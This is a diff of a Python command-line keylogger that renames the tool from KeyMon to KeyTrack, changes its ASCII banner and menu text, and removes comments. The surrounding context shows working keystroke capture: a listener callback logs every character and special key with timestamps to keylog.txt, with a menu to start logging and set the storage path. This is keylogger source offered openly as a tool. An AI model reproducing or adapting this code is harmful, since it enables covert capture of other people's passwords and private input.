@@ -13,7 +13,7 @@ class Colors:
     UNDERLINE = '\033[4m'
     END = '\033[0m'
 
-class KeyMon:
+class KeyTrack:
     def __init__(self):
         self.log_file = "keylog.txt"
         self.listener = None
@@ -26,12 +26,12 @@ class KeyMon:
         # Ultra-Bold Block ASCII Art with Developer Credits
         banner = f"""
 {Colors.CYAN}{Colors.BOLD}
- ██╗  ██╗███████╗██╗   ██╗███╗   ███╗ ██████╗ ███╗   ██╗
- ██║ ██╔╝██╔════╝╚██╗ ██╔╝████╗ ████║██╔═══██╗████╗  ██║
- █████╔╝ █████╗   ╚████╔╝ ██╔████╔██║██║   ██║██╔██╗ ██║
- ██╔═██╗ ██╔══╝    ╚██╔╝  ██║╚██╔╝██║██║   ██║██║╚██╗██║
- ██║  ██╗███████╗   ██║   ██║ ╚═╝ ██║╚██████╔╝██║ ╚████║
- ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
+ ██╗  ██╗███████╗██╗   ██╗████████╗██████╗  █████╗  ██████╗██╗  ██╗
+ ██║ ██╔╝██╔════╝╚██╗ ██╔╝╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
+ █████╔╝ █████╗   ╚████╔╝    ██║   ██████╔╝███████║██║     █████╔╝ 
+ ██╔═██╗ ██╔══╝    ╚██╔╝     ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ 
+ ██║  ██╗███████╗   ██║      ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗
+ ╚═╝  ╚═╝╚══════╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
 {Colors.END}{Colors.PURPLE}{Colors.BOLD}          Developed by: Mohammed Shezil {Colors.END}
 {Colors.YELLOW}             [ PRECISE KEYSTROKE MONITORING ]
 {Colors.END}"""
@@ -55,14 +55,11 @@ class KeyMon:
 
     def on_press(self, key):
         try:
-            # Captures standard alphanumeric keys
             logging.info(f"Key: {key.char}")
         except AttributeError:
-            # Captures special keys like Space, Enter, etc.
             logging.info(f"Special Key: {key}")
 
     def start_logging(self):
-        # Re-initialize logging to ensure it uses the latest path/file settings
         logging.basicConfig(filename=self.log_file, level=logging.DEBUG, 
                             format='%(asctime)s: %(message)s', force=True)
         
@@ -90,11 +87,11 @@ class KeyMon:
             self.clear_screen()
             self.show_header()
             print(f"{Colors.BOLD}CONTROL PANEL:{Colors.END}")
-            print(f" {Colors.GREEN}[1]{Colors.END} INITIALIZE KEYLOGGER")
+            print(f" {Colors.GREEN}[1]{Colors.END} INITIALIZE KEYTRACKER")
             print(f" {Colors.GREEN}[2]{Colors.END} CONFIGURE STORAGE PATH")
             print(f" {Colors.RED}[3]{Colors.END} SHUTDOWN")
             
-            choice = input(f"\n{Colors.CYAN}{Colors.BOLD}KEYMON > {Colors.END}")
+            choice = input(f"\n{Colors.CYAN}{Colors.BOLD}KEYTRACK > {Colors.END}")
 
             if choice == '1':
                 self.start_logging()
@@ -109,9 +106,8 @@ class KeyMon:
                 time.sleep(1)
 
 if __name__ == "__main__":
-    # Initialize Windows console for ANSI color support
     if os.name == 'nt':
         os.system('color') 
     
-    km = KeyMon()
-    km.run()
+    kt = KeyTrack()
+    kt.run()
